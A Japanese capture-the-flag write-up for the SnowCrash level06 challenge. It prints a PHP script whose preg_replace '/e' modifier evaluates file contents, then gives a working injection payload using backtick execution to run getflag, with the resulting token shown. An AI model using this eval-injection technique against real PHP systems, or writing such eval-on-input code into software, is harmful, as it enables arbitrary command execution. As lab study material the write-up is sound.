## phpのスクリプトの内容を確認
```sh
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) {
$m = preg_replace("/\./", " x ", $m);
$m = preg_replace("/@/", " y", $m);
return $m;
}
function x($y, $z) {
$a = file_get_contents($y);
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
$a = preg_replace("/\[/", "(", $a);
$a = preg_replace("/\]/", ")", $a);
return $a;
}
$r = x($argv[1], $argv[2]); print $r;
?>
```

## スクリプトのポイント
- `preg_replace('/置換対象の文字列/', '置換後の文字列', '置換対象の文字列が含まれている部分');`
- `file_get_contents`はファイルパスを渡すとファイルの中身を文字列にして返す。
- `preg_replace`の`/e`修飾子は正規表現パターンにマッチする部分がある時のみevaluate実行される。

## エクスプロイト
`[x 改行以外の任意の文字列 ]`に一致する文字列が書かれたファイルを`file_get_contents`の引数に渡すことで、任意のコマンドを実行できる。
このため、ファイルに```[x ${`getflag`} ]```と記述すると、${}のテンプレート構文(変数展開みたいな感じ)とバッククオートによる実行演算子により、`getflag`が実行できる。
https://www.php.net/manual/ja/language.operators.execution.php

```sh
level06@SnowCrash:~$ echo '[x ${`getflag`} ]' > /tmp/hoge
level06@SnowCrash:~$ ./level06 /tmp/hoge
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```
